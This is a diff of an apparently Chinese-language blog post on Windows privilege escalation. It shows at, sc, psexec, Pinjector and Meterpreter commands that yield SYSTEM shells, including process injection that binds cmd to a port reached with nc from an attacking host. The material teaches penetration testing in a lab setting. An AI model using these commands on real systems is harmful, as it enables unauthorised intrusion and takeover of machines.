@@ -229,7 +229,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：October 16, 2021 pm
+                  本文最后更新于：October 22, 2021 pm
                 
               </p>
             
@@ -244,8 +244,11 @@
 
 
 
-<h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h3><h4 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h4><p>在以前版本（Win7以前）的Windows系统里，可以使用at命令来创建一个计划任务，该计划任务会创建一个交互式的cmd窗口，权限为system</p>
+<h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h3><h4 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h4><p>在老版本的Windows系统里，可以使用at命令来创建一个计划任务，该计划任务会创建一个交互式的cmd窗口，权限为system</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在21:00创建一个交互式、system权限的cmd</span><br>at 21:00 /interactive cmd <br><br><span class="hljs-comment"># 参数解释</span><br><span class="hljs-comment"># /interactive 交互模式运行</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>测试环境，Windows Server 2003 R2</strong></p>
+<img src="/img/Windows提权方式总结/8.gif" srcset="/img/loading.gif" lazyload>
 
 
 
@@ -257,12 +260,15 @@
 <h3 id="SC命令"><a href="#SC命令" class="headerlink" title="SC命令"></a>SC命令</h3><p>SC命令是用来与服务控制管理器和服务进行通信的命令行程序</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个名叫sys_cmd的新的交互式的cmd执行服务</span><br>sc create sys_cmd binPath= <span class="hljs-string">&quot;cmd /K start&quot;</span> <span class="hljs-built_in">type</span>= own <span class="hljs-built_in">type</span>= interact<br><br><span class="hljs-comment"># 参数解释</span><br><span class="hljs-comment"># create 在注册表和服务控制管理器数据库中为服务创建子项和条目</span><br><span class="hljs-comment"># binpath 指定服务二进制文件的路径</span><br><span class="hljs-comment"># type=own 指定在其自己的进程中运行的服务，它不会与其他服务共享可执行文件，这是默认值</span><br><span class="hljs-comment"># type=interact 指定可与桌面交互的服务，从用户处接收输入</span><br><br><span class="hljs-comment">#运行服务</span><br>sc start sys_cmd<br></code></pre></td></tr></table></figure>
 
+<p><strong>测试环境，Windows Server 2003 R2</strong></p>
+<img src="/img/Windows提权方式总结/9.gif" srcset="/img/loading.gif" lazyload>
 
 
-<h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p><strong>使用机器Windows Server 2008 R2测试</strong></p>
-<p>PsExec 是一种轻量级的telnet替代品，可让您在其他系统上执行进程，并与控制台应用程序完全交互，而无需手动安装客户端软件</p>
+
+<h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>PsExec 是一种轻量级的telnet替代品，可让您在其他系统上执行进程，并与控制台应用程序完全交互，而无需手动安装客户端软件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载和介绍地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</span><br>psexec.exe -accepteula -s -i -d cmd<br><br><span class="hljs-comment"># 参数解释</span><br><span class="hljs-comment"># -accepteula 该标志禁止显示许可证对话框</span><br><span class="hljs-comment"># -s 以system身份</span><br><span class="hljs-comment"># -i 交互式运行</span><br><span class="hljs-comment"># -d 指定程序</span><br></code></pre></td></tr></table></figure>
 
+<p><strong>测试环境，Windows Server 2008 R2</strong></p>
 <img src="/img/Windows提权方式总结/2.gif" srcset="/img/loading.gif" lazyload>
 
 
@@ -277,11 +283,10 @@
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></li>
 </ul>
-<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><h4 id="pinjextor（Windows-Server-2003）"><a href="#pinjextor（Windows-Server-2003）" class="headerlink" title="pinjextor（Windows Server 2003）"></a>pinjextor（Windows Server 2003）</h4><p>Pinjector 是一种安全工具，允许用户在其他用户的上下文中执行应用程序，此工具在渗透测试中最常使用，以将代码注入已记录的管理员或域管理员进程，并使用其凭据生成 shell下载地址：<a target="_blank" rel="noopener" href="https://www.tarasco.org/security/Process_Injector/">https://www.tarasco.org/security/Process_Injector/</a></p>
+<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><h4 id="pinjextor"><a href="#pinjextor" class="headerlink" title="pinjextor"></a>pinjextor</h4><p>Pinjector 是一种安全工具，允许用户在其他用户的上下文中执行应用程序，此工具在渗透测试中最常使用，以将代码注入已记录的管理员或域管理员进程，并使用其凭据生成 shell下载地址：<a target="_blank" rel="noopener" href="https://www.tarasco.org/security/Process_Injector/">https://www.tarasco.org/security/Process_Injector/</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 被攻击主机</span><br>$ pinjector -l  <span class="hljs-comment"># 查看当前系统的进程以及创建该进程用户</span><br>$ pinjector -p 420 cmd 3333  <span class="hljs-comment"># inject.exe -p &lt;pid&gt; &lt;cmd&gt; &lt;port&gt; (Inject into PID)</span><br><br><span class="hljs-comment"># 攻击主机</span><br>nc &lt;IP&gt; 3333  <span class="hljs-comment"># 监听被攻击主机的IP及端口即可</span><br></code></pre></td></tr></table></figure>
 
-
-
+<p><strong>测试环境，Windows Server 2003 R2</strong></p>
 <h4 id="MSF进程注入"><a href="#MSF进程注入" class="headerlink" title="MSF进程注入"></a>MSF进程注入</h4><h5 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h5><p>msf Win 10：192.168.199.123</p>
 <p>被攻击主机 Windows Server 2008 R2：192.168.199.205</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">...  <span class="hljs-comment"># 省略上线msf过程</span><br>meterpreter &gt; getuid  <span class="hljs-comment"># 当前权限为Administrator</span><br>Server username: WIN-SP8KQ566UEN\Administrator<br>meterpreter &gt; ps  <span class="hljs-comment"># 查看进程列表</span><br>meterpreter &gt; migrate 424  <span class="hljs-comment"># 迁移到424进程上去，该进程为system用户创建的</span><br>[*] Migrating from 3008 to 424...<br>[*] Migration completed successfully.<br>meterpreter &gt; getuid  <span class="hljs-comment"># 提权为system</span><br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
